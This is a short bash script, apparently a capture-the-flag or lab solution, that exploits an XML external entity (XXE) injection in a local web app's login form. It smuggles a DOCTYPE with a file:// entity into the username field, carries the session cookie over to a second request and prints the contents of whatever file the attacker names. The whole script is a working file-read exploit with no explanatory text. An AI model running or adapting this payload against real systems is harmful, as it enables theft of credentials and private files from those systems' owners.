#!/usr/bin/env bash

file=$1

data="username=BEGINTAG 
%26xxe;
ENDTAG&version=1.33.7 -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file://$file\"> ]>
<!-- Pwned"

cookie=$(curl http://localhost:8888/login -vsd "$data" 2>&1 | grep session= | sed 's/< Set-//g' | tr -d '\r\n')

res=$(curl http://localhost:8888/site -sH "$cookie")

begin=$(( $(echo "$res" | grep -n BEGINTAG | awk -F : '{ print $1 }') + 1 ))
end=$(( $(echo "$res" | grep -n ENDTAG | awk -F : '{ print $1 }') - 1 ))

echo -n "$res" | sed -n "${begin},${end}p"
